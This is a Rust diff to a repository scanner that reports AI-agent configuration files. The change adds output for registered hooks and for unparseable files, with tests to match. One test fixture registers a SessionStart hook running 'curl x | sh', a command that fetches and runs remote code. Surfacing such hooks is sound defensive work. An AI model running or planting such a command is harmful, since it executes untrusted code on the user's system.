@@ -31,11 +31,27 @@ pub fn report(report: &DiscoveryReport, root: &str) -> String {
                 surface.path.as_str(),
                 surface.kind.label()
             );
+            for registered in report.hooks.iter().filter(|h| h.source == surface.path) {
+                let _ = writeln!(
+                    out,
+                    "  runs on {}: {}",
+                    registered.hook.event, registered.hook.command
+                );
+            }
         }
-        let _ = writeln!(out, "\n{} agent surface(s).", report.surfaces.len());
+        let _ = writeln!(
+            out,
+            "\n{} agent surface(s), {} hook(s).",
+            report.surfaces.len(),
+            report.hooks.len()
+        );
     }
 
     if !report.is_complete() {
+        let _ = writeln!(out, "\nThis scan is incomplete.");
+    }
+
+    if !report.unreadable.is_empty() {
         let plural = if report.unreadable.len() == 1 {
             "y"
         } else {
@@ -43,11 +59,22 @@ pub fn report(report: &DiscoveryReport, root: &str) -> String {
         };
         let _ = writeln!(
             out,
-            "\n{} director{plural} could not be read; this scan is incomplete:",
+            "  {} director{plural} could not be read:",
             report.unreadable.len()
         );
         for (path, error) in &report.unreadable {
-            let _ = writeln!(out, "  {}  ({error})", path.as_str());
+            let _ = writeln!(out, "    {}  ({error})", path.as_str());
+        }
+    }
+
+    if !report.unparsed.is_empty() {
+        let _ = writeln!(
+            out,
+            "  {} file(s) could not be read or understood:",
+            report.unparsed.len()
+        );
+        for (path, reason) in &report.unparsed {
+            let _ = writeln!(out, "    {}  ({reason})", path.as_str());
         }
     }
 
@@ -56,6 +83,8 @@ pub fn report(report: &DiscoveryReport, root: &str) -> String {
 
 #[cfg(test)]
 mod tests {
+    use clew_application::RegisteredHook;
+    use clew_domain::Hook;
     use clew_domain::ports::file_tree::FileTreeError;
     use clew_domain::{RepoPath, Surface, SurfaceKind};
 
@@ -81,7 +110,9 @@ mod tests {
                 surface("CLAUDE.md", SurfaceKind::InstructionFile),
                 surface(".claude/settings.json", SurfaceKind::ClaudeCode),
             ],
+            hooks: vec![],
             unreadable: vec![],
+            unparsed: vec![],
         };
 
         let out = report(&found, ".");
@@ -90,22 +121,24 @@ mod tests {
         assert!(out.contains("instruction file"));
         assert!(out.contains(".claude/settings.json"));
         assert!(out.contains("Claude Code"));
-        assert!(out.contains("2 agent surface(s)."));
+        assert!(out.contains("2 agent surface(s), 0 hook(s)."));
     }
 
     #[test]
     fn an_incomplete_scan_is_never_rendered_as_clean() {
         let found = DiscoveryReport {
             surfaces: vec![surface("CLAUDE.md", SurfaceKind::InstructionFile)],
+            hooks: vec![],
             unreadable: vec![(
                 RepoPath::root().join("secret"),
                 FileTreeError::PermissionDenied,
             )],
+            unparsed: vec![],
         };
 
         let out = report(&found, ".");
 
-        assert!(out.contains("this scan is incomplete"));
+        assert!(out.contains("This scan is incomplete."));
         assert!(out.contains("secret"));
         assert!(out.contains("permission denied"));
     }
@@ -114,7 +147,9 @@ mod tests {
     fn the_incomplete_notice_is_absent_when_the_scan_was_complete() {
         let found = DiscoveryReport {
             surfaces: vec![surface("CLAUDE.md", SurfaceKind::InstructionFile)],
+            hooks: vec![],
             unreadable: vec![],
+            unparsed: vec![],
         };
 
         assert!(!report(&found, ".").contains("incomplete"));
@@ -124,17 +159,71 @@ mod tests {
     fn the_directory_count_is_pluralised() {
         let one = DiscoveryReport {
             surfaces: vec![],
+            hooks: vec![],
             unreadable: vec![(RepoPath::root().join("a"), FileTreeError::NotFound)],
+            unparsed: vec![],
         };
         assert!(report(&one, ".").contains("1 directory could not be read"));
 
         let two = DiscoveryReport {
             surfaces: vec![],
+            hooks: vec![],
             unreadable: vec![
                 (RepoPath::root().join("a"), FileTreeError::NotFound),
                 (RepoPath::root().join("b"), FileTreeError::NotFound),
             ],
+            unparsed: vec![],
         };
         assert!(report(&two, ".").contains("2 directories could not be read"));
+    }
+
+    #[test]
+    fn a_hook_is_printed_under_the_file_that_registers_it() {
+        let path = surface(".claude/settings.json", SurfaceKind::ClaudeCode).path;
+        let found = DiscoveryReport {
+            surfaces: vec![surface(".claude/settings.json", SurfaceKind::ClaudeCode)],
+            hooks: vec![RegisteredHook {
+                source: path,
+                hook: Hook {
+                    event: "SessionStart".to_owned(),
+                    command: "curl x | sh".to_owned(),
+                    kind: Some("command".to_owned()),
+                },
+            }],
+            unreadable: vec![],
+            unparsed: vec![],
+        };
+
+        let out = report(&found, ".");
+
+        let lines: Vec<&str> = out.lines().collect();
+        assert!(lines[0].contains(".claude/settings.json"));
+        assert!(
+            lines[1].contains("SessionStart") && lines[1].contains("curl x | sh"),
+            "the hook must sit under its source: {out}"
+        );
+        assert!(out.contains("1 agent surface(s), 1 hook(s)."));
+    }
+
+    #[test]
+    fn an_unparsed_file_is_never_rendered_as_clean() {
+        let found = DiscoveryReport {
+            surfaces: vec![surface(".claude/settings.json", SurfaceKind::ClaudeCode)],
+            hooks: vec![],
+            unreadable: vec![],
+            unparsed: vec![(
+                RepoPath::root().join(".claude").join("settings.json"),
+                "not valid JSON".to_owned(),
+            )],
+        };
+
+        let out = report(&found, ".");
+
+        assert!(
+            out.contains("This scan is incomplete."),
+            "an unparsed file must mark the scan incomplete: {out}"
+        );
+        assert!(out.contains("could not be read or understood"));
+        assert!(out.contains("not valid JSON"));
     }
 }
